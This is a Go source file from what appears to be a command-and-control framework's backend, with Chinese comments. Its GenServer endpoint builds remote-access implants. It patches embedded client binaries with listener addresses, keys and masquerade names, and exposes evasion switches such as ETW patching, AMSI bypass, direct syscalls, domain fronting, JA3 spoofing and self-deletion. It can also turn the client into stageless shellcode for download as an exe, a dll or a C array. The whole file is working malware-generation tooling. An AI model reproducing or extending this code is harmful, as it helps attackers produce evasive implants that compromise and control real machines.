package api

import (
	"BackendTemplate/pkg/c2profile"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/godonut"
	"bytes"
	"compress/gzip"
	"embed"
	"encoding/hex"
	"fmt"
	"io"
	"net/http"
	"strconv"
	"time"
	"strings"
	"unicode/utf16"

	"github.com/gin-gonic/gin"
	"BackendTemplate/pkg/utils/logx"
)

//go:embed server/*
var embeddedFiles embed.FS // 嵌入 server 文件夹

// readTemplate 读取嵌入的客户端模板并解压。
// 模板由 build_templates.sh/ps1 构建后 gzip 压缩（体积降至约 1/3，显著减小服务端二进制）；
// 通过 gzip 魔数(1f 8b)探测，兼容未压缩的旧模板。
func readTemplate(dir, name string) ([]byte, error) {
	data, err := embeddedFiles.ReadFile("server/" + dir + "/" + name)
	if err != nil {
		return nil, err
	}
	if len(data) >= 2 && data[0] == 0x1f && data[1] == 0x8b {
		gr, err := gzip.NewReader(bytes.NewReader(data))
		if err != nil {
			return nil, fmt.Errorf("模板解压失败 %s/%s: %v", dir, name, err)
		}
		defer gr.Close()
		raw, err := io.ReadAll(gr)
		if err != nil {
			return nil, fmt.Errorf("模板解压失败 %s/%s: %v", dir, name, err)
		}
		return raw, nil
	}
	return data, nil
}

func GenServer(c *gin.Context) {
	var serverBody struct {
		OsType      string `json:"osType"`
		ArchType    string `json:"archType"`
		Listener    string `json:"listener"`
		Pass        string `json:"pass"`
		Vkey        string `json:"vkey"`
		EncryptSalt string `json:"encryptSalt"`
		Format      string `json:"format"`    // exe(默认) | dll（仅 windows 目标，rundll32/regsvr32 加载）
		FrontHost   string `json:"frontHost"` // B8: 域前置/CDN 回源 Host（可选，http/https 客户端）
		// OPSEC 编译期配置（可选）
		ReconnectBaseDelay  string `json:"reconnectBaseDelay"`
		ReconnectMaxRetries string `json:"reconnectMaxRetries"`
		InjectTechDefault   string `json:"injectTech"`
		MasqueradeName      string `json:"masqueradeName"`
		QuietMode           string `json:"quietMode"`
		ETWPatch            string `json:"etwPatch"`
		AmsiBypass          string `json:"amsiBypass"`
		SyscallMode         string `json:"syscallMode"`
		AutoDelete          string `json:"autoDelete"`
		UserAgent           string `json:"userAgent"`
		ProfileName         string `json:"profileName"` // C2 Profile（profiles/*.yaml），空=default
	}
	if err := c.BindJSON(&serverBody); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	osType := serverBody.OsType
	archType := serverBody.ArchType

	if serverBody.Listener == "" || !strings.Contains(serverBody.Listener, "://") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "listener 格式错误，应为 protocol://address"})
		return
	}

	listenerTmp := strings.SplitN(serverBody.Listener, "://", 2)
	listenerType := strings.ToLower(listenerTmp[0]) // 转换为小写以匹配文件夹名
	connectAddress := listenerTmp[1]
	// https 有独立客户端目录 server/https（含 https_ 前缀二进制）
	binaryDir := listenerType

	logx.Debugf("🔍 [SERVER-GEN] 解析前端传递的监听器: %s\n", serverBody.Listener)
	logx.Debugf("🔍 [SERVER-GEN] 解析结果 - Type: %s, ConnectAddress: %s, BinaryDir: %s\n", listenerType, connectAddress, binaryDir)

	// 载荷格式：exe/dll/raw 为完整程序；bin/hex/c 为无阶段 shellcode（完整客户端经 donut 转换）
	// dll 仅支持 windows 目标（rundll32/regsvr32 加载）；bin/hex/c 依赖 donut(PE)，仅 windows
	requestFormat := strings.ToLower(strings.TrimSpace(serverBody.Format))
	switch requestFormat {
	case "", "exe", "raw", "dll", "bin", "hex", "c":
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "format 仅支持 exe/dll/raw/bin/hex/c"})
		return
	}
	isShellcodeFmt := requestFormat == "bin" || requestFormat == "hex" || requestFormat == "c"
	if requestFormat == "dll" && strings.ToLower(osType) != "windows" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "dll 格式仅支持 windows 目标"})
		return
	}
	if isShellcodeFmt && strings.ToLower(osType) != "windows" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "bin/hex/c shellcode 格式仅支持 windows 目标（donut 仅转换 PE）"})
		return
	}

	// 查找符合条件的文件
	var binaryFileName string
	if requestFormat == "dll" {
		binaryFileName = findBinaryWithExt(binaryDir, osType, archType, []string{".dll"})
	} else {
		binaryFileName = findBinary(binaryDir, osType, archType)
	}
	if binaryFileName == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": fmt.Sprintf("未找到匹配的客户端二进制: protocol=%s os=%s arch=%s format=%s（请检查 pkg/api/server/%s 下是否有对应预编译文件）",
				listenerType, osType, archType, requestFormat, binaryDir),
		})
		return
	}

	// 从嵌入的文件系统中读取对应文件内容（模板为 gzip 压缩，readTemplate 自动解压）
	binaryData, err := readTemplate(binaryDir, binaryFileName)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "读取文件失败"})
		return
	}

	// ============ 密钥配置解析与 DB 同步（保留 GenServer 特有逻辑） ============
	// 优先使用前端传递的密钥参数，否则从数据库获取
	var masterKey, encryptionSalt []byte

	// 获取监听器的心跳配置
	heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByType(listenerType)
	logx.Debugf("🔍 [SERVER-GEN] 获取监听器心跳配置 - 超时次数: %s, 间隔: %s秒\n", heartbeatTimeout, heartbeatInterval)

	if serverBody.Vkey != "" && serverBody.EncryptSalt != "" {
		// 使用前端传递的密钥参数（不打印完整密钥到日志）
		logx.Debugf("🔍 [SERVER-GEN] 前端传递的密钥参数 - VKey长度: %d, Salt长度: %d\n", len(serverBody.Vkey), len(serverBody.EncryptSalt))

		masterKey = make([]byte, 32)
		copy(masterKey, []byte(serverBody.Vkey))
		// 如果VKey长度不足32字节，用零填充
		for i := len(serverBody.Vkey); i < 32; i++ {
			masterKey[i] = 0
		}

		encryptionSalt = make([]byte, 16)
		copy(encryptionSalt, []byte(serverBody.EncryptSalt))
		// 如果盐长度不足16字节，用零填充
		for i := len(serverBody.EncryptSalt); i < 16; i++ {
			encryptionSalt[i] = 0
		}

		// 注意：不再把前端传入的密钥写回监听器记录（原逻辑会无脑覆盖用户配置的
		// 监听器密钥——前端匹配失败回退的默认密钥会把监听器密钥污染成公开默认值，
		// 导致监听器启动被 J4 拒绝、载荷无法上线）。
		// 监听器记录是密钥的唯一权威来源，客户端 patch 应读取它（前端选择器携带），
		// 而不是反向覆盖。

		// 正向监听器：若记录不存在则创建，保证服务端会话密钥派生与客户端一致
		if listenerType == "tcp_forward" || listenerType == "kcp_forward" || listenerType == "ws_forward" || listenerType == "http_forward" || listenerType == "https_forward" {
			if database.Engine != nil {
				if has, _ := database.Engine.Where("connect_address = ?", connectAddress).Exist(&database.Listener{}); !has {
					_, err := database.Engine.Insert(&database.Listener{
						Type:              listenerType,
						ListenAddress:     connectAddress,
						ConnectAddress:    connectAddress,
						Status:            2, // 未启用；启用后由 handleOpenPort 自动拨号
						HeartbeatTimeout:  "3",
						HeartbeatInterval: "10",
						VKey:              serverBody.Vkey,
						EncryptionSalt:    serverBody.EncryptSalt,
					})
					if err != nil {
						logx.Warnf("⚠️ [SERVER-GEN] 创建%s监听器记录失败: %v\n", listenerType, err)
					} else {
						logx.Infof("🔄 [SERVER-GEN] 已自动创建%s监听器记录: %s（可到正向监听页启用自动拨号）\n", listenerType, connectAddress)
					}
				}
			}
		}

		logx.Infof("🔑 [SERVER-GEN] 使用前端传递的密钥配置生成%s客户端\n", listenerType)
	} else {
		// 优先使用前端传递的默认密钥配置（即使是tcp_forward类型）
		if serverBody.Vkey != "" || serverBody.EncryptSalt != "" {
			// 如果前端传递了部分密钥参数，使用它们
			masterKey = make([]byte, 32)
			copy(masterKey, []byte(serverBody.Vkey))
			for i := len(serverBody.Vkey); i < 32; i++ {
				masterKey[i] = 0
			}
			
			encryptionSalt = make([]byte, 16)
			copy(encryptionSalt, []byte(serverBody.EncryptSalt))
			for i := len(serverBody.EncryptSalt); i < 16; i++ {
				encryptionSalt[i] = 0
			}
			
			logx.Infof("🔑 [SERVER-GEN] 使用前端传递的默认密钥配置生成%s客户端\n", listenerType)
		} else if listenerType == "tcp_forward" || listenerType == "kcp_forward" || listenerType == "ws_forward" || listenerType == "http_forward" || listenerType == "https_forward" {
			// 只有在前端没有传递任何密钥时，才使用正向监听器的特殊默认配置
			masterKey, encryptionSalt = encrypt.GetListenerKeyConfigForForward(listenerType)
			logx.Infof("🔑 [SERVER-GEN] 使用%s监听器的特殊默认密钥配置\n", listenerType)
		} else {
			// 其他类型从数据库获取监听器密钥配置
			// 【修复】按地址匹配失败时回退按类型匹配（与服务端 first blood 的密钥来源完全一致），
			// 避免客户端 patch 的密钥与服务端派生会话密钥不一致导致命令解密失败
			var dbListener database.Listener
			if has, _ := database.Engine.Where("connect_address = ?", connectAddress).Get(&dbListener); has && (dbListener.VKey != "" || dbListener.EncryptionSalt != "") {
				masterKey = make([]byte, 32)
				copy(masterKey, []byte(dbListener.VKey))
				encryptionSalt = make([]byte, 16)
				copy(encryptionSalt, []byte(dbListener.EncryptionSalt))
				logx.Infof("🔑 [SERVER-GEN] 使用监听器数据库密钥配置（地址匹配）\n")
			} else {
				// 地址未匹配：按协议类型取监听器密钥（与服务端 first blood 一致）
				masterKey, encryptionSalt = encrypt.GetListenerKeyConfigForForward(listenerType)
				logx.Infof("🔑 [SERVER-GEN] 地址未匹配监听器，回退按类型 %s 获取密钥配置\n", listenerType)
			}
		}
	}

	if masterKey != nil && encryptionSalt != nil {
		// J4: 默认/空密钥一律拒绝生成（覆盖前端传参/DB/类型回退全部路径）
		if encrypt.IsDefaultListenerKey(masterKey, encryptionSalt) ||
			len(masterKey) == 0 || len(encryptionSalt) == 0 {
			c.JSON(http.StatusBadRequest, gin.H{"error": "未提供有效 VKey/加密盐：请为监听器配置自定义密钥后重新生成客户端"})
			return
		}

		logx.Infof("🔑 [SERVER-GEN] 使用监听器%s的动态密钥配置生成客户端\n", listenerType)
	} else {
		// J4: 未提供自定义密钥时拒绝生成客户端（默认密钥为公开常量：流量可解密、可伪造客户端）
		c.JSON(http.StatusBadRequest, gin.H{"error": "未提供 VKey/加密盐：请为监听器配置自定义密钥后重新生成客户端"})
		return
	}

	// 抖动百分比：配置文件 client.jitter（默认 20）
	jitterStr := "20"
	if g := config.GetGlobalConfig(); g != nil && g.Client.Jitter >= 0 && g.Client.Jitter <= 50 {
		jitterStr = strconv.Itoa(g.Client.Jitter)
	}

	// 【P2-3】统一占位符 patch 引擎（与 WebDelivery 共用 delivery.PatchClientBinary，
	// 含 PASS/主密钥/盐/心跳/抖动/HOST 占位符替换，替换失败即拒绝生成——
	// 原 GenServer 内联替换三处重复实现已合并，含 6KB OSS 占位符字面量）
	m := serverBody.MasqueradeName
	if m != "" {
		// 伪装修饰名合法性校验（字母数字，长度≤16；避免注入分隔符/路径字符）
		m = sanitizeMasquerade(m)
	} else {
		// 未提供时随机生成（不可猜测的品牌前缀）
		m = "svc" + randomSuffix(6)
	}
	quietMode := serverBody.QuietMode
	if quietMode == "" {
		quietMode = "1" // 默认静默（生产 OPSEC）
	}
	// C2 Profile 驱动：URI/WS 路径/心跳基准/UA（profiles/*.yaml，空 profile 用客户端默认）
	prof := c2profile.Get(serverBody.ProfileName)
	// 会话密钥派生盐上下文(配置驱动,两端一致)
	sessionKeyInfo := "8d2c91f4a6"
	if g := config.GetGlobalConfig(); g != nil && g.Security.SessionKeyInfo != "" {
		sessionKeyInfo = g.Security.SessionKeyInfo
	}
	profGetURI, profPostURI, profWSPath, profHB, profUA, profJA3, profDNS := "", "", "", "", "", "", ""
	profMetaCh, profPad := "", true
	if prof != nil {
		profGetURI = prof.HTTP.Get.URI
		profPostURI = prof.HTTP.Post.URI
		profWSPath = prof.WS.Path
		if prof.SleeptimeMs > 0 {
			profHB = fmt.Sprintf("%d", prof.SleeptimeMs)
		}
		profUA = prof.UserAgent
		profJA3 = prof.TLS.JA3
		profDNS = sanitizeMasquerade(prof.DNS.BeaconPrefix)
		profMetaCh = prof.HTTP.Get.MetadataChannel
		profPad = prof.HTTP.Get.Padding
	}
	if serverBody.UserAgent != "" {
		profUA = serverBody.UserAgent // 显式传参优先
	}
	modifiedData, err := delivery.PatchClientBinary(binaryData, delivery.PatchOptions{
		ListenerConfig:      serverBody.Listener,
		OS:                  osType,
		Arch:                archType,
		Pass:                serverBody.Pass,
		VKey:                serverBody.Vkey,
		EncryptSalt:         serverBody.EncryptSalt,
		JitterPercent:       jitterStr,
		ReconnectBaseDelay:  serverBody.ReconnectBaseDelay,
		ReconnectMaxRetries: serverBody.ReconnectMaxRetries,
		InjectTechDefault:   serverBody.InjectTechDefault,
		MasqueradeName:      m,
		QuietMode:           quietMode,
		ETWPatch:            serverBody.ETWPatch,
		AmsiBypass:          serverBody.AmsiBypass,
		SyscallMode:         serverBody.SyscallMode,
		AutoDelete:          serverBody.AutoDelete,
		UserAgent:           profUA,
		Format:              requestFormat,
		HashPad:             cfgHashPad(),
		HTTPGetURI:          profGetURI,
		HTTPPostURI:         profPostURI,
		WSPath:              profWSPath,
		HeartbeatMs:         profHB,
		TLSJA3:              profJA3,
		DNSLabelPrefix:      profDNS,
		SessionKeyInfo:      sessionKeyInfo,
		MetadataChannel:     profMetaCh,
		Padding:             boolToOnOff(profPad),
	})
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	logx.Infof("❤️ [SERVER-GEN] 已将监听器心跳配置应用到客户端 - 间隔: %s秒, 超时: %s次, 抖动: %s%%\n", heartbeatInterval, heartbeatTimeout, jitterStr)

	// bin/hex/c：无阶段 shellcode（完整客户端经 donut 转换，运行即上线，无需分阶段拉取）
	if isShellcodeFmt {
		sc, err := godonut.GenShellcode(modifiedData, serverBody.Pass, archType)
		if err != nil || len(sc) == 0 {
			c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("donut 转换 shellcode 失败: %v", err)})
			return
		}
		var content []byte
		var filename, ctype string
		switch requestFormat {
		case "bin":
			content = sc
			filename = "stageless_shellcode.bin"
			ctype = "application/octet-stream"
		case "hex":
			content = []byte(hex.EncodeToString(sc))
			filename = "stageless_shellcode.txt"
			ctype = "text/plain"
		case "c":
			var cb bytes.Buffer
			cb.WriteString("unsigned char shellcode[] = \"")
			for i, b := range sc {
				if i > 0 && i%32 == 0 {
					cb.WriteString("\"\n    \"")
				}
				cb.WriteString(fmt.Sprintf("\\x%02x", b))
			}
			cb.WriteString("\";\n")
			content = cb.Bytes()
			filename = "stageless_shellcode.c"
			ctype = "text/x-csrc"
		}
		c.Header("Content-Disposition", "attachment; filename="+filename)
		c.Header("Content-Type", ctype)
		c.Header("Content-Length", fmt.Sprintf("%d", len(content)))
		c.Writer.Write(content)
		return
	}

	// 设置下载响应头：二进制载荷必须显式声明 Content-Type。
	// UTF8EncodingMiddleware 会对未设置 Content-Type 的 /api 响应强制标记
	// application/json，前端会把二进制误判为 JSON 错误响应（生成失败）。
	// 【修复】文件名按协议+系统区分（与模板命名一致）：tcp 协议即 tcp_linux_amd64，
	// windows 追加 .exe/.dll；linux/darwin 可执行文件无 .exe 后缀
	fileName := listenerType + "_" + osType + "_" + archType
	switch requestFormat {
	case "dll":
		fileName += ".dll"
	default:
		if strings.ToLower(osType) == "windows" {
			fileName += ".exe"
		}
	}
	c.Header("Content-Disposition", "attachment; filename="+fileName)
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Length", fmt.Sprintf("%d", len(modifiedData)))

	// 直接将字节写入响应体
	c.Writer.Write(modifiedData)
}
func findBinary(listenerType, osType, archType string) string {
	return findBinaryWithExt(listenerType, osType, archType, nil)
}

// findBinaryWithExt 查找匹配的模板文件，exts 可指定额外扩展名（如 ".dll"）；nil 表示默认 .exe/无后缀
func findBinaryWithExt(listenerType, osType, archType string, exts []string) string {
	entries, err := embeddedFiles.ReadDir("server/" + listenerType)
	if err != nil {
		return ""
	}

	// 收集目录中的所有文件名
	fileSet := make(map[string]struct{})
	for _, entry := range entries {
		if !entry.IsDir() {
			fileSet[entry.Name()] = struct{}{}
		}
	}

	// 统一命名规则：{协议前缀}_{os}_{arch}[.exe]
	// 示例：tcp_linux_amd64、ws_windows_amd64.exe、http_linux_amd64、tcp_forward_windows_amd64.exe
	// 协议前缀见 getProtocolName / binaryNamePrefixes（websocket → ws）
	// 指定 exts（如 .dll）时只按这些扩展名匹配，避免命中 .exe 模板
	var suffixes []string
	if len(exts) > 0 {
		for _, ext := range exts {
			suffixes = append(suffixes, osType+"_"+archType+ext)
		}
	} else {
		suffixes = []string{
			osType + "_" + archType + ".exe",
			osType + "_" + archType,
		}
	}
	prefixes := binaryNamePrefixes(listenerType)

	for _, prefix := range prefixes {
		for _, suffix := range suffixes {
			candidate := prefix + suffix
			if _, ok := fileSet[candidate]; ok {
				return candidate
			}
		}
	}

	return ""
}

// binaryNamePrefixes 返回协议文件名前缀（标准名优先，旧名仅作兼容回退）
// 标准格式：{prefix}{os}_{arch}[.exe]，如 tcp_linux_amd64、ws_windows_amd64.exe
func binaryNamePrefixes(listenerType string) []string {
	switch listenerType {
	case "tcp":
		return []string{"tcp_", "t_", "r_"}
	case "tcp_forward":
		return []string{"tcp_forward_", "tcp_", "t_", "r_"}
	case "kcp_forward":
		return []string{"kcp_forward_", "kcp_", "r_", "t_"}
	case "ws_forward":
		return []string{"ws_forward_", "ws_", "websocket_", "r_", "t_"}
	case "http_forward":
		return []string{"http_forward_", "https_", "http_", "r_", "t_"}
	case "https_forward":
		return []string{"https_forward_", "https_", "http_", "r_", "t_"}
	case "kcp":
		return []string{"kcp_", "r_", "t_"}
	case "http", "https":
		return []string{"http_", "https_", "r_", "t_"}
	case "websocket":
		// 标准前缀为 ws_（与 getProtocolName 一致）
		return []string{"ws_", "websocket_", "r_", "t_"}
	case "oss":
		return []string{"oss_", "r_", "t_"}
	case "dns":
		return []string{"dns_", "r_", "t_"}
	default:
		protocolName := getProtocolName(listenerType)
		return []string{protocolName + "_", "r_", "t_"}
	}
}

// getProtocolName 根据监听器类型返回协议名
func getProtocolName(listenerType string) string {
	switch listenerType {
	case "tcp":
		return "tcp"
	case "tcp_forward":
		return "tcp_forward"
	case "kcp_forward":
		return "kcp_forward"
	case "ws_forward":
		return "ws_forward"
	case "http_forward":
		return "http_forward"
	case "https_forward":
		return "https_forward"
	case "kcp":
		return "kcp"
	case "http":
		return "http"
	case "https":
		return "http" // https 使用 http 客户端
	case "websocket":
		return "ws"
	case "oss":
		return "oss"
	case "dns":
		return "dns"
	default:
		// 默认情况下使用监听器类型本身
		return listenerType
	}
}

// 填充空格到指定长度（供本包各文件使用；delivery 包内有独立同名实现）
func padRight(str string, length int) string {
	if len(str) >= length {
		return str
	}
	return str + strings.Repeat(" ", length-len(str))
}

// utf16LE UTF-16 LE编码
func utf16LE(s string) []byte {
	encoded := utf16.Encode([]rune(s))
	out := make([]byte, len(encoded)*2)
	for i, v := range encoded {
		out[i*2] = byte(v)        // 低字节
		out[i*2+1] = byte(v >> 8) // 高字节
	}
	return out
}
func ShowListener(c *gin.Context) {
	var listeners []database.Listener
	database.Engine.Where("status = ?", 1).Find(&listeners)

	var result []string
	for _, listener := range listeners {
		result = append(result, listener.Type+"://"+listener.ConnectAddress)
	}
	c.JSON(http.StatusOK, gin.H{"status": 200, "data": result})

}

// ShowListenerDetails 返回监听器的详细信息
func ShowListenerDetails(c *gin.Context) {
	// 直接查询所有活跃的监听器，包含ID
	var listeners []database.Listener
	database.Engine.Where("status = ?", 1).Find(&listeners)

	type ListenerDetail struct {
		ID             int64  `json:"id"`
		URL            string `json:"url"`
		Protocol       string `json:"protocol"`
		ListenAddress  string `json:"listenAddress"`
		ConnectAddress string `json:"connectAddress"`
		Status         int    `json:"status"`
	}

	var result []ListenerDetail
	for _, listener := range listeners {
		// 使用直接查询到的数据，其中包含真实ID
		detail := ListenerDetail{
			ID:             listener.Id, // 直接使用数据库ID
			URL:            listener.Type + "://" + listener.ConnectAddress,
			Protocol:       listener.Type,
			ListenAddress:  listener.ListenAddress,
			ConnectAddress: listener.ConnectAddress,
			Status:         listener.Status,
		}
		result = append(result, detail)
	}

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": result})
}


// sanitizeMasquerade 伪装修饰名前缀合法性校验：仅保留字母数字（长度≤16），
// 避免注入路径分隔符/特殊字符破坏生成的持久化对象名/管道名/文件名。
func sanitizeMasquerade(s string) string {
	var sb strings.Builder
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') {
			sb.WriteRune(r)
		}
		if sb.Len() >= 16 {
			break
		}
	}
	out := sb.String()
	if out == "" {
		out = "svc"
	}
	return out
}

// randomSuffix 随机字母数字后缀（伪装修饰名不可猜测）
func randomSuffix(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	seed := uint64(time.Now().UnixNano())
	for i := range b {
		seed = seed*1103515245 + 12345
		b[i] = chars[seed>>32%uint64(len(chars))]
	}
	return string(b)
}

// cfgHashPad 从全局配置读取载荷 Hash 轮换开关（默认开启）
func cfgHashPad() bool {
	if g := config.GetGlobalConfig(); g != nil {
		return g.Obfuscation.HashPad
	}
	return true
}

// boolToOnOff bool -> "1"/"0"
func boolToOnOff(b bool) string {
	if b {
		return "1"
	}
	return "0"
}
